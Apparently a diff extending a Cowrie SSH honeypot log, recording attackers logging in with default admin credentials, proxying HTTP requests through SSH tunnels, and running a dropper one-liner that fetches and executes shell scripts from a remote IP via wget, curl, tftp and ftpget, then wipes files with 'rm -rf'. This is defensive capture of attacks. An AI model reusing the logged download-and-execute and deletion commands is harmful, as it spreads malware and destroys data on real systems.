@@ -7411,3 +7411,120 @@
 2017-06-01T17:32:46+0000 [HoneyPotSSHTransport,1315,163.172.138.239] avatar admin logging out
 2017-06-01T17:32:46+0000 [HoneyPotSSHTransport,1315,163.172.138.239] connection lost
 2017-06-01T17:32:46+0000 [HoneyPotSSHTransport,1315,163.172.138.239] Connection lost after 13 seconds
+2017-06-01T17:33:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-01T17:33:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] direct-tcp connection request to 64.98.36.4:25 from localhost:5556
+2017-06-01T17:33:10+0000 [SSHChannel None (27) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] remote eof
+2017-06-01T17:33:10+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 163.172.138.239:36720 (10.8.41.81:2222) [session: 5135d64b]
+2017-06-01T17:33:10+0000 [SSHChannel None (27) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] remote close
+2017-06-01T17:33:10+0000 [SSHChannel None (27) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] sending close 27
+2017-06-01T17:33:10+0000 [HoneyPotSSHTransport,1316,163.172.138.239] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-06-01T17:33:10+0000 [HoneyPotSSHTransport,1316,163.172.138.239] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-01T17:33:10+0000 [HoneyPotSSHTransport,1316,163.172.138.239] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-01T17:33:10+0000 [HoneyPotSSHTransport,1316,163.172.138.239] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-01T17:33:10+0000 [HoneyPotSSHTransport,1316,163.172.138.239] NEW KEYS
+2017-06-01T17:33:10+0000 [HoneyPotSSHTransport,1316,163.172.138.239] starting service 'ssh-userauth'
+2017-06-01T17:33:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1316,163.172.138.239] 'admin' trying auth 'password'
+2017-06-01T17:33:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1316,163.172.138.239] login attempt: 21
+2017-06-01T17:33:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1316,163.172.138.239] login return, expect: [admin/admin]
+2017-06-01T17:33:12+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1316,163.172.138.239] login attempt [admin/admin] succeeded
+2017-06-01T17:33:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1316,163.172.138.239] 'admin' authenticated with 'password'
+2017-06-01T17:33:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1316,163.172.138.239] starting service 'ssh-connection'
+2017-06-01T17:33:14+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1316,163.172.138.239] got channel 'session' request
+2017-06-01T17:33:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1316,163.172.138.239] channel open
+2017-06-01T17:33:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1316,163.172.138.239] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.48.238/armex.sh; curl -O http://51.15.48.238/armex.sh; chmod 777 armex.sh; sh armex.sh; tftp 51.15.48.238 -c get armexft.sh; chmod 777 armexft.sh; sh armexft.sh; tftp 51.15.48.238 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.48.238; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+	"
+2017-06-01T17:33:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1316,163.172.138.239] Opening TTY Log: log/tty/20170601-173314-5135d64b-0e.log
+2017-06-01T17:33:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1316,163.172.138.239] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.48.238/armex.sh; curl -O http://51.15.48.238/armex.sh; chmod 777 armex.sh; sh armex.sh; tftp 51.15.48.238 -c get armexft.sh; chmod 777 armexft.sh; sh armexft.sh; tftp 51.15.48.238 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.48.238; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+	
+2017-06-01T17:33:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1316,163.172.138.239] Command found: cd /tmp
+2017-06-01T17:33:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1316,163.172.138.239] Command found: cd /var/run
+2017-06-01T17:33:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1316,163.172.138.239] Command found: cd /mnt
+2017-06-01T17:33:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1316,163.172.138.239] Command found: cd /root
+2017-06-01T17:33:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1316,163.172.138.239] Command found: cd /
+2017-06-01T17:33:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1316,163.172.138.239] Command found: wget http://51.15.48.238/armex.sh
+2017-06-01T17:33:14+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: curl -O http://51.15.48.238/armex.sh
+2017-06-01T17:33:14+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-01T17:33:14+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: chmod 777 armex.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: sh armex.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.48.238 -c get armexft.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: chmod 777 armexft.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: sh armexft.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.48.238 -c get tftp1.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 51.15.48.238
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] FTP retrieval failed: 425 Security: Bad IP connecting.
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170601-173314-5135d64b-0e.log after 0 seconds
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-01T17:33:14+0000 [HTTPPageDownloader,client] sending close 0
+2017-06-01T17:33:14+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-01T17:33:24+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1316,163.172.138.239] remote close
+2017-06-01T17:33:24+0000 [HoneyPotSSHTransport,1316,163.172.138.239] avatar admin logging out
+2017-06-01T17:33:24+0000 [HoneyPotSSHTransport,1316,163.172.138.239] connection lost
+2017-06-01T17:33:24+0000 [HoneyPotSSHTransport,1316,163.172.138.239] Connection lost after 14 seconds
+2017-06-01T17:33:26+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-01T17:33:26+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp connection request to 134.119.192.227:8888 from localhost:5556
+2017-06-01T17:33:26+0000 [SSHChannel None (228) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp forward to 134.119.192.227:8888 with data 'GET /v3/callerinfo/?geo=false HTTP/1.1\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Java/1.8.0_66\r\nHost: 134.119.192.227:8888\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n\r\n'
+2017-06-01T17:33:26+0000 [SSHChannel None (228) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] failed to connect: Connection refused
+2017-06-01T17:33:26+0000 [SSHChannel None (228) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] sending close 228
+2017-06-01T17:33:28+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-01T17:33:28+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp connection request to 134.119.192.227:8888 from localhost:5556
+2017-06-01T17:33:30+0000 [SSHChannel None (229) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp forward to 134.119.192.227:8888 with data 'GET /v3/callerinfo/?geo=false HTTP/1.1\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Java/1.8.0_66\r\nHost: 134.119.192.227:8888\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n\r\n'
+2017-06-01T17:33:30+0000 [SSHChannel None (229) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] failed to connect: Connection refused
+2017-06-01T17:33:30+0000 [SSHChannel None (229) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] sending close 229
+2017-06-01T17:33:32+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-01T17:33:32+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp connection request to 134.119.192.227:8888 from localhost:5556
+2017-06-01T17:33:33+0000 [SSHChannel None (230) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp forward to 134.119.192.227:8888 with data 'GET /v3/callerinfo/?geo=false HTTP/1.1\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Java/1.8.0_66\r\nHost: 134.119.192.227:8888\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n\r\n'
+2017-06-01T17:33:33+0000 [SSHChannel None (230) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] failed to connect: Connection refused
+2017-06-01T17:33:33+0000 [SSHChannel None (230) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] sending close 230
+2017-06-01T17:33:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-01T17:33:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp connection request to 134.119.192.227:8888 from localhost:5556
+2017-06-01T17:33:34+0000 [SSHChannel None (231) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp forward to 134.119.192.227:8888 with data 'GET /v3/callerinfo/?geo=false HTTP/1.1\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Java/1.8.0_66\r\nHost: 134.119.192.227:8888\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n\r\n'
+2017-06-01T17:33:34+0000 [SSHChannel None (231) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] failed to connect: Connection refused
+2017-06-01T17:33:34+0000 [SSHChannel None (231) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] sending close 231
+2017-06-01T17:33:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-01T17:33:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp connection request to 134.119.192.227:8888 from localhost:5556
+2017-06-01T17:33:35+0000 [SSHChannel None (232) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp forward to 134.119.192.227:8888 with data 'GET /v3/callerinfo/?geo=false HTTP/1.1\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Java/1.8.0_66\r\nHost: 134.119.192.227:8888\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n\r\n'
+2017-06-01T17:33:35+0000 [SSHChannel None (232) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] failed to connect: Connection refused
+2017-06-01T17:33:35+0000 [SSHChannel None (232) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] sending close 232
+2017-06-01T17:33:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-01T17:33:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp connection request to 134.119.192.227:8888 from localhost:5556
+2017-06-01T17:33:37+0000 [SSHChannel None (233) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp forward to 134.119.192.227:8888 with data 'GET /v3/callerinfo/?geo=false HTTP/1.1\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Java/1.8.0_66\r\nHost: 134.119.192.227:8888\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n\r\n'
+2017-06-01T17:33:37+0000 [SSHChannel None (233) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] failed to connect: Connection refused
+2017-06-01T17:33:37+0000 [SSHChannel None (233) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] sending close 233
+2017-06-01T17:33:38+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-01T17:33:38+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp connection request to 134.119.192.227:8888 from localhost:5556
+2017-06-01T17:33:38+0000 [SSHChannel None (234) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp forward to 134.119.192.227:8888 with data 'GET /v3/callerinfo/?geo=false HTTP/1.1\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Java/1.8.0_66\r\nHost: 134.119.192.227:8888\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n\r\n'
+2017-06-01T17:33:38+0000 [SSHChannel None (234) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] failed to connect: Connection refused
+2017-06-01T17:33:38+0000 [SSHChannel None (234) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] sending close 234
+2017-06-01T17:33:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-01T17:33:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp connection request to 134.119.192.227:8888 from localhost:5556
+2017-06-01T17:33:39+0000 [SSHChannel None (235) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp forward to 134.119.192.227:8888 with data 'GET /v3/callerinfo/?geo=false HTTP/1.1\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Java/1.8.0_66\r\nHost: 134.119.192.227:8888\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n\r\n'
+2017-06-01T17:33:39+0000 [SSHChannel None (235) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] failed to connect: Connection refused
+2017-06-01T17:33:39+0000 [SSHChannel None (235) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] sending close 235
+2017-06-01T17:33:41+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-01T17:33:41+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp connection request to 134.119.192.227:8888 from localhost:5556
+2017-06-01T17:33:41+0000 [SSHChannel None (236) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp forward to 134.119.192.227:8888 with data 'GET /v3/callerinfo/?geo=false HTTP/1.1\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Java/1.8.0_66\r\nHost: 134.119.192.227:8888\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n\r\n'
+2017-06-01T17:33:41+0000 [SSHChannel None (236) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] failed to connect: Connection refused
+2017-06-01T17:33:41+0000 [SSHChannel None (236) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] sending close 236
+2017-06-01T17:33:42+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-01T17:33:42+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp connection request to 134.119.192.227:8888 from localhost:5556
+2017-06-01T17:33:42+0000 [SSHChannel None (237) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp forward to 134.119.192.227:8888 with data 'GET /v3/callerinfo/?geo=false HTTP/1.1\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Java/1.8.0_66\r\nHost: 134.119.192.227:8888\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n\r\n'
+2017-06-01T17:33:42+0000 [SSHChannel None (237) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] failed to connect: Connection refused
+2017-06-01T17:33:42+0000 [SSHChannel None (237) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] sending close 237
+2017-06-01T17:33:54+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-01T17:33:54+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp connection request to 136.243.58.37:80 from localhost:5556
+2017-06-01T17:33:54+0000 [SSHChannel None (238) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] direct-tcp forward to 136.243.58.37:80 with data 'GET /internals/api/ip?1496338388291138346 HTTP/1.1\r\nHost: ip2.adspy.mobi\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.67 Safari/537.36\r\nAccept-Encoding: gzip, deflate, sdch\r\n\r\n'
+2017-06-01T17:33:54+0000 [SSHChannel None (238) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] failed to connect: Connection refused
+2017-06-01T17:33:54+0000 [SSHChannel None (238) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1239,91.230.47.81] sending close 238
